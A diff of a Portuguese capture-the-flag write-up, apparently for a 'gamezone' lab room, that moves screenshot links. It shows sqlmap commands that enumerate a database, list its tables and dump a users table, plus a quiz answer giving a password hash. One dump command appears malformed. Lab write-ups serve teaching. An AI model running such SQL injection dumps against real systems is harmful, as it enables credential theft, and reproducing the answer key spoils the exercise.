@@ -29,15 +29,15 @@ sqlmap -r request.txt --current-db
 
 Descobrimos que temos um banco de dados chamado 'db'
 
-![image](https://github.com/yanfernandess/gamezone/assets/100174458/e0590bd6-1677-4274-a095-f79b125ed9f7)
-
 sqlmap -r request.txt -D db --tables
 
-![image](https://github.com/yanfernandess/gamezone/assets/100174458/10fe000e-346e-499d-96f2-3b2ab7c228ec)
+![image](https://github.com/yanfernandess/gamezone/assets/100174458/e0590bd6-1677-4274-a095-f79b125ed9f7)
 
 Temos duas tabelas dentro do banco de dados, vamos explorar elas.
 
 sqlmap -r request.txt -D db users --dump
+
+![image](https://github.com/yanfernandess/gamezone/assets/100174458/10fe000e-346e-499d-96f2-3b2ab7c228ec)
 
 In the users table, what is the hashed password?
 R: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
